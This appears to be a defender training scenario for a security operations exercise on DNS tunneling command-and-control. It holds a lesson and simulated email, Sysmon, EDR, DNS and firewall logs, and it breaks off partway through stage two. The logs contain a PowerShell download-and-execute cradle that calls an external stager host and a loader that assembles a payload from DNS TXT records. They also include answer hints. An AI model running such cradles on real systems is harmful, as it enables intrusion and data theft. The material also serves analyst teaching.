{
  "name": "DNS Tunneling & Covert C2 Communication",
  "description": "An advanced scenario where an attacker establishes a covert command-and-control channel using DNS tunneling. Analysts must identify anomalous DNS patterns including encoded subdomain labels, abnormal query frequencies, and TXT record abuse to trace the full attack chain from initial phishing infection through data exfiltration over DNS.",
  "difficulty": "ADVANCED",
  "category": "Command and Control",
  "mitreAttackIds": ["T1071.004", "T1132", "T1041", "T1573", "T1105", "T1059.001"],
  "briefing": "## Scenario Briefing — DNS Tunneling & Covert C2\n\nA network monitoring sensor has flagged anomalous DNS traffic patterns from workstation **WS-PC15**. The DNS query volume from this single host has increased **500%** in the last hour, with queries containing unusually long subdomain labels. Initial triage shows the queries are going to a domain registered just **48 hours ago**. This could be DNS tunneling — a covert communication technique that abuses the DNS protocol.\n\n### What We Know So Far\n\n- **Affected Host:** WS-PC15 (10.0.1.92), assigned to user **a.kumar** (Finance department)\n- **Suspicious Domain:** `updateservice-cdn.com` — registered 2 days ago via a privacy-shielded registrar\n- **DNS Query Volume:** ~3,200 queries in the past hour vs. the host's 30-day average of ~600/hour\n- **Query Characteristics:** Subdomain labels exceeding 50 characters, high entropy strings resembling Base64 encoding\n- **Resolver:** Queries bypassing corporate DNS (10.0.2.1) and going directly to 198.51.100.53\n\n### Your Mission\n\n1. **Identify the initial infection vector** — How did the malware get on WS-PC15?\n2. **Analyze the DNS tunneling mechanism** — What encoding is used? What tool is likely in play?\n3. **Determine what C2 commands were executed** — What did the attacker do once they had a channel?\n4. **Assess the data exfiltration** — What data was stolen and how much?\n5. **Recommend containment and remediation actions**\n\n### Key Analysis Focus Areas\n\n- DNS query name length and entropy\n- Query frequency and beaconing intervals\n- TXT record request patterns\n- Subdomain label encoding schemes\n- DNS traffic volume compared to baseline\n\n**Difficulty:** Advanced | **Estimated Time:** 60 minutes",
  "lessonContent": "# DNS Tunneling & Covert C2 — Pre-Investigation Lesson\n\nBefore you begin the investigation, let's build a deep understanding of how DNS works, how attackers abuse it for tunneling, and how to detect it.\n\n---\n\n## 1. DNS Protocol Fundamentals\n\nThe Domain Name System (DNS) is one of the most critical — and most trusted — protocols on any network. It translates human-readable domain names (like `google.com`) into IP addresses (like `142.250.80.46`).\n\n### DNS Record Types\n\n| Record Type | Purpose | Example | Max Data Size |\n|---|---|---|---|\n| **A** | Maps domain to IPv4 address | `example.com → 93.184.216.34` | 4 bytes |\n| **AAAA** | Maps domain to IPv6 address | `example.com → 2606:2800:220:1:...` | 16 bytes |\n| **TXT** | Stores arbitrary text data | SPF records, DKIM keys, verification tokens | ~255 bytes per string |\n| **CNAME** | Alias one domain to another | `www.example.com → example.com` | 255 bytes |\n| **MX** | Mail server for the domain | `example.com → mail.example.com` | 255 bytes |\n| **NS** | Authoritative nameserver | `example.com → ns1.example.com` | 255 bytes |\n| **SRV** | Service location | `_sip._tcp.example.com → sip.example.com` | 255 bytes |\n\n### Normal DNS Query Flow\n\n```\n1. User types \"google.com\" in browser\n2. OS checks local DNS cache\n3. Query sent to configured DNS resolver (corporate: 10.0.2.1)\n4. Resolver checks its cache, or queries root → TLD → authoritative servers\n5. Response returned with IP address\n6. Browser connects to the IP\n```\n\n### Why DNS Is Attractive to Attackers\n\n- **Almost never blocked** — DNS (port 53) is allowed outbound on virtually every network\n- **Rarely inspected deeply** — Most firewalls allow DNS traffic without content inspection\n- **Ubiquitous** — Every connected device makes DNS queries, so it blends into normal traffic\n- **Recursive resolution** — Queries will eventually reach the attacker's authoritative nameserver\n- **Supports arbitrary data** — TXT records can hold any text content\n\n---\n\n## 2. How DNS Tunneling Works\n\nDNS tunneling encodes data into DNS queries and responses, effectively creating a bidirectional communication channel over port 53.\n\n### The Mechanism\n\n**Upstream (Client → C2 Server):**\nData is encoded into the subdomain labels of DNS queries.\n\n```\nNormal query:   www.google.com\nTunnel query:   aGVsbG8gd29ybGQ.cmd.data.ns1.updateservice-cdn.com\n                ^^^^^^^^^^^^^^^^ ^^^ ^^^^\n                Base64-encoded   |   Tunnel identifier\n                payload data     Command channel marker\n```\n\nThe attacker's authoritative nameserver for `updateservice-cdn.com` receives these queries and decodes the subdomain labels to extract the data.\n\n**Downstream (C2 Server → Client):**\nData is encoded into DNS responses, typically using TXT records (which support up to 255 bytes per string, with multiple strings possible).\n\n```\nQuery:    beacon.data.ns1.updateservice-cdn.com  TXT\nResponse: \"d2hvYW1pDQpzeXN0ZW1pbmZvDQpuZXQgdXNlcg==\" (Base64 for commands)\n```\n\n### Data Encoding Schemes\n\n| Scheme | Description | Efficiency | Detection |\n|---|---|---|---|\n| **Base64** | Standard Base64 encoding | ~75% | High entropy, `=` padding visible |\n| **Base32** | Uses A-Z, 2-7 only | ~63% | Easier to detect — unusual character distribution |\n| **Hex** | Hexadecimal encoding | ~50% | Only 0-9, a-f characters in labels |\n| **NetBIOS** | Custom encoding | Varies | Tool-specific patterns |\n| **Raw binary** | Direct binary via EDNS | ~95% | Requires EDNS support |\n\n### DNS Label Constraints\n\n- Each label (between dots): max **63 characters**\n- Total domain name: max **253 characters**\n- This limits per-query upstream bandwidth to roughly **180-200 bytes** of encoded data\n- Attackers compensate with **high query volume**\n\n---\n\n## 3. Common DNS Tunneling Tools\n\n### dnscat2\n- Open-source DNS tunneling tool\n- Creates encrypted C2 channel over DNS\n- Supports TXT, CNAME, MX, and A record queries\n- Uses its own encryption layer on top of DNS\n- Client process: `dnscat` or embedded in PowerShell scripts\n- Server process: Ruby-based server on attacker's authoritative NS\n\n### iodine\n- Tunnels IPv4 traffic through DNS\n- Supports NULL, TXT, SRV, MX, CNAME, and A record types\n- Uses Base32, Base64, or raw encoding\n- Creates a virtual network interface (tun device)\n- Client process: `iodine` / Server process: `iodined`\n\n### dns2tcp\n- Tunnels TCP connections over DNS\n- Uses TXT records for data transfer\n- Supports resource record types: KEY, TXT\n- Lightweight — designed for simple TCP relay\n\n### Cobalt Strike DNS Beacon\n- Commercial (and frequently pirated) C2 framework\n- DNS beacon mode communicates entirely over DNS\n- Uses A, AAAA, and TXT record queries\n- Configurable beacon interval (sleep time)\n- Malleable C2 profiles can customize DNS patterns\n\n---\n\n## 4. Detection Indicators\n\nDNS tunneling generates detectable anomalies across multiple dimensions:\n\n### Query Name Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **Subdomain label length** | 5-15 characters | 30-63 characters |\n| **Total query length** | 15-40 characters | 80-253 characters |\n| **Character entropy** | Low-medium (readable words) | High (encoded data) |\n| **Character set** | Alphanumeric, hyphens | Base64 chars (+, /, =) or hex only |\n| **Label count** | 2-4 labels | 4-8+ labels |\n\n### Traffic Pattern Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **Queries per minute** | 5-20 per host | 50-500+ per host |\n| **Unique subdomains** | Low (repeat visits) | Extremely high (every query unique) |\n| **TXT query ratio** | <5% of queries | >50% of queries |\n| **Single domain focus** | Queries spread across many domains | 80%+ to one domain |\n| **Query timing** | Irregular, user-driven | Regular intervals (beaconing) |\n\n### Volume Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **DNS bytes per hour** | 10-50 KB | 500 KB - 10 MB+ |\n| **Response size (TXT)** | Short SPF/DKIM records | Large, encoded binary data |\n| **Query-to-response ratio** | Roughly 1:1 | May show 1:many for data exfil |\n\n### Entropy Scoring\n\nEntropy measures the randomness of a string. Normal domain names have low entropy (readable words); encoded tunnel data has high entropy.\n\n```\nLow entropy:    www.google.com              (Shannon entropy: ~2.8)\nMedium entropy: cdn-images-us.example.com   (Shannon entropy: ~3.5)\nHigh entropy:   aGVsbG8gd29ybGQ.c2.evil.com (Shannon entropy: ~4.5+)\n```\n\nAn entropy threshold of **3.5-4.0** on subdomain labels catches most tunneling while avoiding false positives from CDN hostnames.\n\n---\n\n## 5. DNS over HTTPS (DoH) — The Evasion Layer\n\nModern attackers increasingly use **DNS over HTTPS (DoH)** to hide DNS tunneling:\n\n- DNS queries are sent inside HTTPS (port 443) to resolvers like `https://dns.google/dns-query`\n- Content is encrypted, so network security tools cannot inspect the query contents\n- Appears as normal HTTPS traffic to firewalls and proxies\n- Bypasses DNS-layer security tools entirely\n\n### Detection Strategies for DoH\n\n- Block or monitor known DoH resolver IPs (Google: 8.8.8.8, Cloudflare: 1.1.1.1)\n- Monitor for TLS connections to known DoH endpoints\n- Use endpoint-level DNS logging (Sysmon Event ID 22) instead of network-level\n- Deploy browser policies that force system DNS resolver usage\n\n---\n\n## 6. Normal vs. Abnormal DNS Baselines\n\nTo detect DNS tunneling, you need to know what normal looks like:\n\n### Normal Workstation DNS Profile (8-hour workday)\n\n- **Total queries:** 3,000-5,000\n- **Unique domains:** 200-500\n- **TXT queries:** <2% of total\n- **Average query length:** 22 characters\n- **Max query length:** ~50 characters (long CDN hostnames)\n- **Top domains:** google.com, microsoft.com, office365.com, company.com\n- **Query timing:** Clustered around browsing activity, irregular intervals\n\n### DNS Tunneling Profile (1 hour)\n\n- **Total queries:** 2,000-10,000+ (to a single domain)\n- **Unique subdomains:** Nearly 100% unique\n- **TXT queries:** >60% of total\n- **Average query length:** 80+ characters\n- **Max query length:** 200+ characters\n- **Top domain:** Single attacker-controlled domain\n- **Query timing:** Regular 10-60 second intervals (beaconing)\n\n---\n\n## 7. Investigation Methodology\n\nWhen you suspect DNS tunneling, follow this process:\n\n1. **Identify the suspect domain** — Look for newly registered domains with high query volume\n2. **Analyze query patterns** — Check subdomain length, entropy, and record types\n3. **Establish the timeline** — When did the anomalous queries start?\n4. **Trace the infection** — What happened on the host before DNS tunneling began?\n5. **Identify the tool** — Query patterns can fingerprint dnscat2 vs. iodine vs. Cobalt Strike\n6. **Assess impact** — Calculate approximate data volume exfiltrated\n7. **Contain and remediate** — Block the domain, isolate the host, remove the implant\n\n---\n\n## Ready?\n\nWhen you're ready, click **Continue to Investigation** to start analyzing the DNS tunneling incident. Pay close attention to query patterns, subdomain encoding, and timing intervals. Good luck!",
  "estimatedMinutes": 60,
  "isActive": true,
  "stages": [
    {
      "stageNumber": 1,
      "title": "Initial Infection Vector",
      "description": "Investigate how the malware was delivered to WS-PC15. Trace the initial phishing email, macro execution, and payload delivery attempt that ultimately drove the attacker to use DNS tunneling as their C2 channel.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "EMAIL_GATEWAY",
          "summary": "Email Gateway — Inbound email to a.kumar@corp.local from 'invoices@globaltrade-partners.com' with subject 'Q3 Financial Review — Action Required'. Contains macro-enabled attachment 'Q3_Financial_Summary.xlsm' (186 KB). SPF passed but DKIM failed. Sender domain registered 3 days ago.",
          "rawLog": {
            "messageId": "<8f3a2b1c-94d7-4e5f-b8a1-3c7d9e2f5a1b@globaltrade-partners.com>",
            "timestamp": "2025-09-18T09:12:38Z",
            "from": "invoices@globaltrade-partners.com",
            "to": "a.kumar@corp.local",
            "subject": "Q3 Financial Review — Action Required",
            "attachments": [
              {
                "filename": "Q3_Financial_Summary.xlsm",
                "size": 190464,
                "contentType": "application/vnd.ms-excel.sheet.macroEnabled.12",
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
              }
            ],
            "spfResult": "pass",
            "dkimResult": "fail",
            "dmarcResult": "none",
            "senderIp": "185.234.72.19",
            "xMailer": "Microsoft Outlook 16.0",
            "returnPath": "invoices@globaltrade-partners.com",
            "receivedHeaders": [
              "from mail.globaltrade-partners.com (185.234.72.19) by mx01.corp.local (10.0.4.5) with ESMTPS; Thu, 18 Sep 2025 09:12:38 +0000"
            ],
            "action": "DELIVERED",
            "threatScore": 35,
            "domainAge": "3 days"
          },
          "severity": "MEDIUM",
          "hostname": "MX-GW-01",
          "username": "a.kumar",
          "sourceIp": "185.234.72.19",
          "destIp": "10.0.4.5",
          "timestamp": "2025-09-18T09:12:38Z",
          "isEvidence": true,
          "evidenceTag": "PHISHING_EMAIL",
          "sortOrder": 1
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event ID 1 — Process creation: EXCEL.EXE spawned cmd.exe on WS-PC15. User a.kumar opened the macro-enabled spreadsheet, which executed a command shell — a strong indicator of malicious macro execution.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-09-18T09:15:42Z",
            "ProcessGuid": "{WS-PC15-a1b2c3d4-0001}",
            "ProcessId": 7824,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADUAMwAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==",
            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0000}",
            "ParentProcessId": 6112,
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\a.kumar\\Downloads\\Q3_Financial_Summary.xlsm\"",
            "User": "CORP\\a.kumar",
            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
            "IntegrityLevel": "Medium",
            "LogonGuid": "{WS-PC15-login-a1b2}",
            "LogonId": "0x3E7"
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "processName": "cmd.exe",
          "eventId": "1",
          "timestamp": "2025-09-18T09:15:42Z",
          "isEvidence": true,
          "evidenceTag": "MACRO_EXECUTION",
          "sortOrder": 2
        },
        {
          "logType": "EDR_ALERT",
          "summary": "EDR Alert — Suspicious macro execution detected on WS-PC15. EXCEL.EXE spawned cmd.exe which launched PowerShell with a Base64-encoded command. Classified as likely malicious macro payload delivery (T1059.001).",
          "rawLog": {
            "alertId": "EDR-2025-09182301",
            "severity": "HIGH",
            "timestamp": "2025-09-18T09:15:44Z",
            "hostname": "WS-PC15",
            "username": "CORP\\a.kumar",
            "processName": "powershell.exe",
            "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "commandLine": "powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADUAMwAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==",
            "decodedCommand": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.53/stager.ps1')",
            "parentProcess": "cmd.exe",
            "grandparentProcess": "EXCEL.EXE",
            "alertType": "Malicious Macro — Office Application Spawning Script Interpreter",
            "detectionRule": "OFFICE_CHILD_SCRIPT_INTERPRETER",
            "mitreTactic": "Execution",
            "mitreTechnique": "T1059.001",
            "riskScore": 92,
            "actionTaken": "ALERT_ONLY"
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "processName": "powershell.exe",
          "timestamp": "2025-09-18T09:15:44Z",
          "isEvidence": true,
          "evidenceTag": "EDR_MACRO_ALERT",
          "sortOrder": 3
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — WS-PC15 queried for the A record of the attacker's payload hosting server at 198.51.100.53. The domain 'updateservice-cdn.com' was resolved through the corporate DNS resolver.",
          "rawLog": {
            "timestamp": "2025-09-18T09:15:45Z",
            "queryName": "updateservice-cdn.com",
            "queryType": "A",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "198.51.100.53",
            "srcIp": "10.0.1.92",
            "srcPort": 54821,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 60,
            "querySize": 38,
            "responseSize": 54
          },
          "severity": "MEDIUM",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "198.51.100.53",
          "timestamp": "2025-09-18T09:15:45Z",
          "isEvidence": true,
          "evidenceTag": "C2_DOMAIN_RESOLUTION",
          "sortOrder": 4
        },
        {
          "logType": "FIREWALL",
          "summary": "Firewall — BLOCKED outbound HTTP connection from WS-PC15 (10.0.1.92) to external IP 198.51.100.53 on port 80. The corporate firewall blocks direct HTTP to non-whitelisted external IPs, forcing the attacker to find an alternative communication channel.",
          "rawLog": {
            "timestamp": "2025-09-18T09:15:47Z",
            "action": "DENY",
            "direction": "OUTBOUND",
            "srcIp": "10.0.1.92",
            "srcPort": 49312,
            "dstIp": "198.51.100.53",
            "dstPort": 80,
            "protocol": "TCP",
            "rule": "BLOCK-OUTBOUND-HTTP-NONWHITELIST",
            "zone": "WORKSTATION->EXTERNAL",
            "reason": "Outbound HTTP to non-whitelisted destination blocked by policy",
            "application": "powershell.exe",
            "bytesBlocked": 0,
            "sessionId": "fw-sess-2025091809154701"
          },
          "severity": "MEDIUM",
          "hostname": "FW-EDGE-01",
          "sourceIp": "10.0.1.92",
          "destIp": "198.51.100.53",
          "processName": "powershell.exe",
          "timestamp": "2025-09-18T09:15:47Z",
          "isEvidence": true,
          "evidenceTag": "BLOCKED_HTTP_C2",
          "sortOrder": 5
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event ID 1 — PowerShell executed a second encoded command after the direct HTTP download failed. This command initiates DNS-based payload retrieval as a fallback mechanism, querying TXT records to download the stager in chunks.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-09-18T09:16:05Z",
            "ProcessGuid": "{WS-PC15-a1b2c3d4-0003}",
            "ProcessId": 8456,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -c \"$d='';for($i=0;$i -lt 12;$i++){$d+=(Resolve-DnsName -Name \\\"stage$i.data.ns1.updateservice-cdn.com\\\" -Type TXT).Strings};IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))\"",
            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0001}",
            "ParentProcessId": 7824,
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine": "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAo...",
            "User": "CORP\\a.kumar",
            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
            "IntegrityLevel": "Medium"
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "processName": "powershell.exe",
          "eventId": "1",
          "timestamp": "2025-09-18T09:16:05Z",
          "isEvidence": true,
          "evidenceTag": "DNS_PAYLOAD_DOWNLOAD",
          "sortOrder": 6
        }
      ],
      "hints": [
        {
          "content": "Look at the process parent-child chain: EXCEL.EXE spawned cmd.exe which launched PowerShell. Office applications should NEVER launch command interpreters — this is a classic malicious macro indicator.",
          "pointsPenalty": 3,
          "sortOrder": 1
        },
        {
          "content": "The firewall blocked the direct HTTP download to 198.51.100.53. Notice how the attacker's payload includes a fallback mechanism that uses DNS TXT record queries to download the stager instead. This is why the attacker pivoted to DNS tunneling.",
          "pointsPenalty": 4,
          "sortOrder": 2
        },
        {
          "content": "The Base64-encoded PowerShell command in the Sysmon log decodes to: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.53/stager.ps1'). This is a classic cradle download technique (T1059.001 + T1105).",
          "pointsPenalty": 3,
          "sortOrder": 3
        }
      ]
    },
    {
      "stageNumber": 2,
      "title": "DNS Tunneling Establishment",
      "description": "Analyze the DNS traffic patterns that indicate a covert tunneling channel has been established. Compare abnormal queries to normal DNS baselines and identify the tunneling tool's fingerprint.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "DNS",
          "summary": "DNS Log — Normal baseline DNS query from WS-PC15 resolving 'www.google.com' (A record). This is legitimate user browsing activity and serves as a comparison baseline for the anomalous queries that follow.",
          "rawLog": {
            "timestamp": "2025-09-18T09:20:01Z",
            "queryName": "www.google.com",
            "queryType": "A",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "142.250.80.46",
            "srcIp": "10.0.1.92",
            "srcPort": 61234,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 300,
            "querySize": 32,
            "responseSize": 48
          },
          "severity": "INFO",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:20:01Z",
          "isEvidence": false,
          "sortOrder": 1
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — Normal baseline DNS query from WS-PC15 resolving 'outlook.office365.com' (CNAME → A). Legitimate Office 365 traffic — short query name, standard record type, well-known domain.",
          "rawLog": {
            "timestamp": "2025-09-18T09:20:15Z",
            "queryName": "outlook.office365.com",
            "queryType": "A",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "52.96.166.34",
            "srcIp": "10.0.1.92",
            "srcPort": 53412,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 120,
            "querySize": 38,
            "responseSize": 54,
            "cnameChain": ["outlook.ha.office365.com", "outlook.ms-acdc.office.com"]
          },
          "severity": "INFO",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:20:15Z",
          "isEvidence": false,
          "sortOrder": 2
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — SUSPICIOUS TXT query with Base64-encoded subdomain label (52 characters). WS-PC15 queried 'aW5pdGlhbGl6ZV9jMl9jaGFubmVsX3YxLjI.data.ns1.updateservice-cdn.com' — this is the DNS tunnel initialization handshake.",
          "rawLog": {
            "timestamp": "2025-09-18T09:25:12Z",
            "queryName": "aW5pdGlhbGl6ZV9jMl9jaGFubmVsX3YxLjI.data.ns1.updateservice-cdn.com",
            "queryType": "TXT",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "\"Y29ubmVjdGVkOnNlc3Npb24taWQ9QUI3OEMyRDQ=\"",
            "srcIp": "10.0.1.92",
            "srcPort": 52001,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 0,
            "querySize": 84,
            "responseSize": 142,
            "queryNameLength": 67,
            "subdomainEntropy": 4.52
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:25:12Z",
          "isEvidence": true,
          "evidenceTag": "DNS_TUNNEL_INIT",
          "sortOrder": 3
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — SUSPICIOUS TXT query with encoded subdomain (58 characters). Part of rapid burst of DNS queries to data.ns1.updateservice-cdn.com — query interval is 2 seconds, consistent with DNS tunneling tool beaconing.",
          "rawLog": {
            "timestamp": "2025-09-18T09:25:14Z",
            "queryName": "c2Vzc2lvbl9jb25maXJtX2hlYXJ0YmVhdF9wa3QwMQ.data.ns1.updateservice-cdn.com",
            "queryType": "TXT",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "\"YWNrOmhlYXJ0YmVhdF9pbnRlcnZhbD0zMHM=\"",
            "srcIp": "10.0.1.92",
            "srcPort": 52003,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 0,
            "querySize": 91,
            "responseSize": 138,
            "queryNameLength": 73,
            "subdomainEntropy": 4.61
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:25:14Z",
          "isEvidence": true,
          "evidenceTag": "DNS_TUNNEL_BEACON",
          "sortOrder": 4
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — SUSPICIOUS TXT query with 61-character encoded subdomain label. Third query in rapid succession to updateservice-cdn.com within 4 seconds. TTL is 0 (no caching), which is highly unusual and ensures every query reaches the authoritative nameserver.",
          "rawLog": {
            "timestamp": "2025-09-18T09:25:16Z",
            "queryName": "ZW5jcnlwdGlvbl9uZWdvdGlhdGVfYWVzMjU2X2tleXhjaGc.data.ns1.updateservice-cdn.com",
            "queryType": "TXT",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "\"a2V5OkFFUy0yNTYtQ0JDOml2PTRkNjU3MzY1NzQ2OTZmNmU=\"",
            "srcIp": "10.0.1.92",
            "srcPort": 52005,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 0,
            "querySize": 97,
            "responseSize": 156,
            "queryNameLength": 79,
            "subdomainEntropy": 4.73
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:25:16Z",
          "isEvidence": true,
          "evidenceTag": "DNS_TUNNEL_ENCRYPTION_NEGOTIATION",
          "sortOrder": 5
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event ID 1 — Process creation of 'svchost-update.exe' spawned by PowerShell on WS-PC15. The binary name is masquerading as a legitimate Windows service host. This is the DNS tunneling client (likely dnscat2) that was assembled from the TXT record payload chunks.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-09-18T09:24:58Z",
            "ProcessGuid": "{WS-PC15-a1b2c3d4-0005}",
            "ProcessId": 9120,
            "Image": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
            "CommandLine": "\"C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe\" --dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57",
            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0003}",
            "ParentProcessId": 8456,
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "User": "CORP\\a.kumar",
            "Hashes": "SHA256=7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
            "IntegrityLevel": "Medium",
            "FileVersion": "1.0.0.0",
            "Description": "Windows Service Host Update",
            "OriginalFileName": "dnscat2-client.exe"
          },
          "severity": "CRITICAL",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "processName": "svchost-update.exe",
          "eventId": "1",
          "timestamp": "2025-09-18T09:24:58Z",
          "isEvidence": true,
          "evidenceTag": "DNS_TUNNEL_CLIENT",
          "sortOrder": 6
        },
        {
          "logType": "NETWORK_FLOW",
          "summary": "Network Flow — DNS traffic volume anomaly from WS-PC15. In a 10-minute window, the host generated 847 DNS queries (142 KB total) compared to its baseline of 8-12 queries per 10-minute window. 94% of queries are TXT type to a single domain.",
          "rawLog": {
            "timestamp": "2025-09-18T09:30:00Z",
            "srcIp": "10.0.1.92",
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "bytesIn": 98240,
            "bytesOut": 142580,
            "packetsIn": 847,
            "packetsOut": 847,
            "duration": 600,
            "application": "DNS",
            "hostname": "WS-PC15",
            "queryCount": 847,
            "uniqueDomains": 1,
            "topDomain": "data.ns1.updateservice-cdn.com",
            "txtQueryPercentage": 94.2,
            "avgQueryLength": 78.4,
            "baselineQueriesPer10Min": 10,
            "anomalyScore": 98.7
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:30:00Z",
          "isEvidence": true,
          "evidenceTag": "DNS_TRAFFIC_ANOMALY",
          "sortOrder": 7
        },
        {
          "logType": "SIEM_ALERT",
          "summary": "SIEM Correlation Alert — DNS anomaly detection rule triggered. WS-PC15 is generating DNS queries with subdomain entropy >4.0, query lengths >50 characters, and >90% TXT type queries to a single recently-registered domain. Pattern matches known DNS tunneling behavior.",
          "rawLog": {
            "alertId": "SIEM-CORR-2025-4471",
            "ruleName": "DNS Tunneling — High Entropy Subdomain Labels with Anomalous Volume",
            "severity": "CRITICAL",
            "timestamp": "2025-09-18T09:30:15Z",
            "correlatedEvents": 847,
            "sourceHost": "WS-PC15",
            "sourceIp": "10.0.1.92",
            "suspectDomain": "data.ns1.updateservice-cdn.com",
            "indicators": {
              "avgSubdomainEntropy": 4.58,
              "avgQueryNameLength": 78,
              "txtQueryRatio": 0.942,
              "queriesPerMinute": 84.7,
              "uniqueSubdomains": 843,
              "domainAge": "2 days",
              "ttlValue": 0,
              "registrar": "PrivacyShield Registrations LLC"
            },
            "timeWindow": "10 minutes",
            "dataSources": ["DNS Logs", "Network Flow", "Threat Intelligence"],
            "recommendation": "Investigate host WS-PC15 immediately. DNS tunneling suspected. Consider blocking domain and isolating host.",
            "confidenceScore": 97.3
          },
          "severity": "CRITICAL",
          "hostname": "WS-PC15",
